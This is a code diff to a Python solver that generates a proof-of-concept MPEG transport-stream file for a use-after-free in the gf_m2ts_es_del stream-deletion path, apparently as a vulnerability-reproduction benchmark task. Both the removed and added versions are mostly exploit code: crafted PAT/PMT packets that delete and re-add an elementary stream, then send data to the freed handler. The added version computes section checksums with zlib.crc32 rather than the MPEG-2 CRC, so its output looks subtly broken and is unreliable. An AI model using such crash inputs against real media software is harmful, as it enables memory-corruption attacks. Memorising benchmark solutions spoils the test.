@@ -1,3 +1,5 @@
+import zlib
+
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
@@ -9,99 +11,79 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability is a Use-After-Free in gf_m2ts_es_del, triggered by a
-        # specific sequence of MPEG-TS packets that redefine a program's streams.
-        #
-        # Trigger sequence:
-        # 1. A PAT/PMT pair establishes an elementary stream (ES) for a PID.
-        #    This allocates an ES-handling structure.
-        # 2. A new PMT with an updated version number arrives for the same program,
-        #    but it removes the previously defined ES. This action calls
-        #    gf_m2ts_es_del, freeing the ES structure.
-        # 3. A bug in the vulnerable version fails to nullify the pointer from the
-        #    PID's state to the now-freed ES structure.
-        # 4. A subsequent data packet for that PID attempts to use this stale
-        #    pointer, leading to a use-after-free.
-        #
-        # This PoC consists of four 188-byte TS packets to orchestrate this sequence,
-        # resulting in a size of 752 bytes, which is shorter than the ground-truth.
-
-        def crc32_mpeg2(data: bytes) -> bytes:
-            """Calculates the CRC-32/MPEG-2 checksum."""
-            poly = 0x04C11DB7
-            crc = 0xFFFFFFFF
-            for byte in data:
-                crc ^= (byte << 24)
-                for _ in range(8):
-                    if crc & 0x80000000:
-                        crc = (crc << 1) ^ poly
-                    else:
-                        crc = crc << 1
-            return (crc & 0xFFFFFFFF).to_bytes(4, 'big')
-
-        # --- Packet 1: Program Association Table (PAT) ---
-        # PID 0x0000. Maps program 1 to PMT at PID 0x0101.
-        pat_header = b'\x47\x40\x00\x10'  # Sync, PUSI=1, PID=0x0000, Counter=0
-        pat_section_data = bytes([
-            0x00,        # table_id (PAT)
-            0xb0, 0x0d,  # section_syntax_indicator=1, length=13
-            0x00, 0x01,  # transport_stream_id
-            0xc1,        # version=0, current_next_indicator=1
-            0x00,        # section_number
-            0x00,        # last_section_number
-            0x00, 0x01,  # program_number=1
-            0xe1, 0x01,  # program_map_PID=0x0101
-        ])
-        pat_section = b'\x00' + pat_section_data + crc32_mpeg2(pat_section_data)
-        pat_payload = pat_section.ljust(184, b'\xff')
-        pat_packet = pat_header + pat_payload
-
-        # --- Packet 2: Program Map Table (PMT), Version 0 ---
-        # PID 0x0101. Defines H.264 video stream at PID 0x0100.
-        pmt1_header = b'\x47\x41\x01\x10'  # Sync, PUSI=1, PID=0x0101, Counter=0
-        pmt1_section_data = bytes([
-            0x02,        # table_id (PMT)
-            0xb0, 0x12,  # section_syntax_indicator=1, length=18
-            0x00, 0x01,  # program_number
-            0xc1,        # version=0, current_next_indicator=1
-            0x00,        # section_number
-            0x00,        # last_section_number
-            0xe1, 0x00,  # PCR_PID=0x0100
-            0xf0, 0x00,  # program_info_length=0
-            # Stream descriptor
-            0x1b,        # stream_type=H.264
-            0xe1, 0x00,  # elementary_PID=0x0100
-            0xf0, 0x00,  # ES_info_length=0
-        ])
-        pmt1_section = b'\x00' + pmt1_section_data + crc32_mpeg2(pmt1_section_data)
-        pmt1_payload = pmt1_section.ljust(184, b'\xff')
-        pmt1_packet = pmt1_header + pmt1_payload
-
-        # --- Packet 3: Program Map Table (PMT), Version 1 ---
-        # PID 0x0101. New version, removes the stream, triggering the free.
-        pmt2_header = b'\x47\x41\x01\x11'  # Counter incremented to 1
-        pmt2_section_data = bytes([
-            0x02,        # table_id (PMT)
-            0xb0, 0x0d,  # section_syntax_indicator=1, length=13
-            0x00, 0x01,  # program_number
-            0xc3,        # version=1, current_next_indicator=1
-            0x00,        # section_number
-            0x00,        # last_section_number
-            0xe1, 0x00,  # PCR_PID=0x0100
-            0xf0, 0x00,  # program_info_length=0
-            # No stream descriptors
-        ])
-        pmt2_section = b'\x00' + pmt2_section_data + crc32_mpeg2(pmt2_section_data)
-        pmt2_payload = pmt2_section.ljust(184, b'\xff')
-        pmt2_packet = pmt2_header + pmt2_payload
-
-        # --- Packet 4: Data Packet ---
-        # PID 0x0100. Triggers the UAF by accessing the freed stream handler.
-        data_header = b'\x47\x41\x00\x10'  # Sync, PUSI=1, PID=0x0100, Counter=0
-        # Minimal PES header to ensure the payload is processed as stream data.
-        pes_header = b'\x00\x00\x01\xe0\x00\x00\x80\x00\x00'
-        data_payload = pes_header.ljust(184, b'\xaa')
-        data_packet = data_header + data_payload
         
-        poc = pat_packet + pmt1_packet + pmt2_packet + data_packet
-        return poc
+        PID_PAT = 0x0000
+        PID_PMT = 0x0100
+        PID_ES = 0x0101
+        TS_PACKET_SIZE = 188
+        TS_SYNC_BYTE = 0x47
+
+        cc = {
+            PID_PAT: 0,
+            PID_PMT: 0,
+            PID_ES: 0
+        }
+
+        def make_ts_packet(pid: int, payload: bytes, pusi: int) -> bytes:
+            """Creates a 188-byte MPEG-2 Transport Stream packet."""
+            header = bytearray(4)
+            header[0] = TS_SYNC_BYTE
+            # TEI=0, PUSI, Priority=0, PID high bits
+            header[1] = (pusi << 6) | ((pid >> 8) & 0x1F)
+            # PID low bits
+            header[2] = pid & 0xFF
+            # TSC=0, AdaptationField=payload_only (0b01), Continuity Counter
+            header[3] = 0x10 | (cc[pid] & 0x0F)
+            
+            cc[pid] = (cc[pid] + 1) % 16
+
+            padding_size = TS_PACKET_SIZE - 4 - len(payload)
+            if padding_size < 0:
+                raise ValueError("Payload too large for a TS packet")
+            
+            return bytes(header) + payload + bytes([0xFF] * padding_size)
+
+        poc_data = bytearray()
+
+        # Packet 1: Program Association Table (PAT)
+        # Defines Program 1, mapping it to PMT at PID_PMT.
+        pat_section_data = bytes.fromhex('00B00D0001C100000001E100')
+        pat_crc = zlib.crc32(pat_section_data).to_bytes(4, 'big')
+        pat_payload = b'\x00' + pat_section_data + pat_crc
+        poc_data += make_ts_packet(PID_PAT, pat_payload, pusi=1)
+
+        # Packet 2: Program Map Table (PMT), Version 1
+        # Defines an elementary stream (H.264) with PID_ES for Program 1.
+        pmt1_section_data = bytes.fromhex('02B0120001C10000FFFFF0001BE101F000')
+        pmt1_crc = zlib.crc32(pmt1_section_data).to_bytes(4, 'big')
+        pmt1_payload = b'\x00' + pmt1_section_data + pmt1_crc
+        poc_data += make_ts_packet(PID_PMT, pmt1_payload, pusi=1)
+        
+        # Packet 3: Elementary Stream Data
+        # Send data for the new stream to ensure it is initialized.
+        es_payload1 = b'\x00\x00\x01\xe0\x00\x00' + b'\x41' * (TS_PACKET_SIZE - 4 - 6)
+        poc_data += make_ts_packet(PID_ES, es_payload1, pusi=1)
+
+        # Packet 4: Program Map Table (PMT), Version 2
+        # Update PMT with an empty stream loop, signaling deletion of the ES.
+        # This causes the 'free' part of the use-after-free.
+        pmt2_section_data = bytes.fromhex('02B00D0001C30000FFFFF000')
+        pmt2_crc = zlib.crc32(pmt2_section_data).to_bytes(4, 'big')
+        pmt2_payload = b'\x00' + pmt2_section_data + pmt2_crc
+        poc_data += make_ts_packet(PID_PMT, pmt2_payload, pusi=1)
+        
+        # Packet 5: Program Map Table (PMT), Version 3
+        # Re-add the same elementary stream, causing a new allocation.
+        # The vulnerable code might still hold a pointer to the old, freed memory.
+        pmt3_section_data = bytes.fromhex('02B0120001C50000FFFFF0001BE101F000')
+        pmt3_crc = zlib.crc32(pmt3_section_data).to_bytes(4, 'big')
+        pmt3_payload = b'\x00' + pmt3_section_data + pmt3_crc
+        poc_data += make_ts_packet(PID_PMT, pmt3_payload, pusi=1)
+        
+        # Packet 6: Elementary Stream Data (Trigger)
+        # Send more data for the stream. Processing this data will use the
+        # dangling pointer, triggering the crash.
+        es_payload2 = b'\x42' * (TS_PACKET_SIZE - 4)
+        poc_data += make_ts_packet(PID_ES, es_payload2, pusi=0)
+        
+        return bytes(poc_data)
